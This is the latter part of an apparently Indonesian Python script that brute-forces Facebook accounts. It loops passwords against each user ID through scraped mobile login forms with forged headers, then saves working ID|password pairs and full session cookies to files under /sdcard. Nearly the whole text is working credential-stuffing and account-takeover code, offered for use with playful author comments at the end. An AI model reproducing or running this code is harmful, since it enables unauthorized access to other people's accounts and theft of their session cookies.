			'referer': 'https://m.prod.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			})
			po = ses.post("https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", data=dataa,headers=heade,cookies={'cookie': koki_kon},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r ══➤ {K}{uid}|{pw}    {P}')
				open('/sdcard/AT-CHEK/'+cpe,'a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r ══➤ {H}{uid}|{pw}    {P}')
				print(f' ══➤{U}{kuki} {P}')
				open('/sdcard/AT-LIVE/'+oke,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#<----------[ DEF-ASYNC ]---------->#
def asyncc(uid,pasat):
	global loop,ok,cp
	AteGanteng.update(GantengPoll,description=f' [TEGAR] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	AteGanteng.advance(GantengPoll)
	ua = AteUgen()
	ses = requests.Session()
	for pw in pasat:
		try:
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
			'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
			'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
			'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1),
			'try_number': '0',
			'unrecognized_tries': '0',
			'email': uid,
			'pass': pw,
			'prefill_contact_point': '',
			'prefill_source': '',
			'prefill_type': '',
			'first_prefill_source': '',
			'first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'false',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)
			}
			koki_kon = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": 'https://m.facebook.com/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,headers=heade,cookies={'cookie': koki_kon},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r ══➤ {K}{uid}|{pw}    {P}')
				open('/sdcard/AT-CHEK/'+cpe,'a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r ══➤ {H}{uid}|{pw}    {P}')
				print(f' ══➤{U}{kuki} {P}')
				open('/sdcard/AT-LIVE/'+oke,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#<----------[__MAIN__]------------->#
if __name__=='__main__':
	try:os.mkdir('/sdcard/AT-LIVE')
	except:pass
	try:os.mkdir('/sdcard/AT-CHEK')
	except:pass
	login_at()
# INGET JANGAN DIPERJUAL BELIKAN BLOK
# JANGAN BERHARAP YG TIDAK PASTI
# OPREK AJA BIAR FULL IJO
# MAKASIH AUGTHOR KANG OPREK:)
# AT_GANTENG YA KAN :)